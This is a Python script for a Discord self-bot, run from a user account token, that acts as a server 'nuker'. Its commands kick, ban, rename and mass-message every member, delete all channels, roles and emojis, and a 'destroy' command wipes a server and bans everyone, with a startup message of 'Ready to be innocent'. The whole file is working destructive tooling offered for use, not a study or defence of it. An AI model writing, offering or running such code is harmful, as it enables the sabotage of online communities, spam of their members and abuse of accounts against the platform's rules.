# CONFIG
# ---------
token = ""  # To find this, it's harder than it used to be. Please Google the process.
prefix = "~"  # This will be used at the start of commands.
# ----------

# Imports the needed libs.
import discord
from discord.ext import commands

print ("Loading..")

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")  # Declares the bot, passes it a prefix and lets it know to only listen to itself.


@bot.event
async def on_ready():
    print ("Ready to be innocent.")


async def self_check(ctx):
    """
    A secondary check to ensure nobody but the owner can run these commands
    """
    if bot.user.id == ctx.message.author.id:
        return True
    else:
        return False


@commands.check(self_check)
@bot.command(pass_context=True)
async def kall(ctx):
    """
    Kicks every member in a server
    """
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} has been kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
    print ("Action Completed: kall")


@commands.check(self_check)
@bot.command(pass_context=True)
async def ball(ctx):
    """
    Bans every member in a server
    """
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
    print ("Action Completed: ball")


@commands.check(self_check)
@bot.command(pass_context=True)
async def rall(ctx, rename_to):
    """
    Renames every member in a server
    """
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=rename_to)
            print (f"{user.name} has been renamed to {rename_to} in {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been renamed to {rename_to} in {ctx.guild.name}")
    print ("Action Completed: rall")


@commands.check(self_check)
@bot.command(pass_context=True)
async def mall(ctx, *, message):
    """
    Messages every member in a server
    """
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.send(message)
            print(f"{user.name} has recieved the message.")
        except:
            print(f"{user.name} has NOT recieved the message.")
    print("Action Completed: mall")


@commands.check(self_check)
@bot.command(pass_context=True)
async def dall(ctx, condition):
    """
    Can perform multiple actions that envolve mass deleting
    """
    if condition.lower() == "channels":
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        print ("Action Completed: dall channels")
    elif condition.lower() == "roles":
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        print ("Action Completed: dall roles")
    elif condition.lower() == "emojis":
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        print ("Action Completed: dall emojis")
    elif condition.lower() == "all":
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
                print (f"{channel.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print (f"{emoji.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
        print ("Action Completed: dall all")


@commands.check(self_check)
@bot.command(pass_context=True)
async def destroy(ctx):
    """
    Outright destroys a server
    """
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{emoji.name} has NOT been deleted in {ctx.guild.name}")

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            print (f"{channel.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{channel.name} has NOT been deleted in {ctx.guild.name}")

    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted in {ctx.guild.name}")
        except:
            print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")

    print ("Action Completed: destroy")

bot.run(token, bot=False)  # Starts the bot by passing it a token and telling it it isn't really a bot.
